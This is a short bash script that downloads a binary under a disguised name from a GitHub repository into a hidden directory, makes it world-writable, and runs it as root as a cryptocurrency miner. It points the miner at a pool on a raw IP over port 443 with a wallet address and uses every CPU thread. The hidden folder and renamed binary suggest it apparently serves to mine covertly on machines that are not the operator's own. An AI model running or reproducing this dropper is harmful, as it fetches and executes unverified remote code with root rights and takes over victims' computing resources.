#!/bin/bash
apt-get update ; apt-get -y install sudo
mkdir .kap && cd .kap
wget -O skak https://github.com/nandafiku/fillesg/raw/main/serbe
chmod 777 skak
sudo ./skak --algorithm aurum --pool 45.76.185.233:443 --wallet bit1qvfwy07cf2yn2ue03xu2na8lw2gzmytzrttsfcy.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
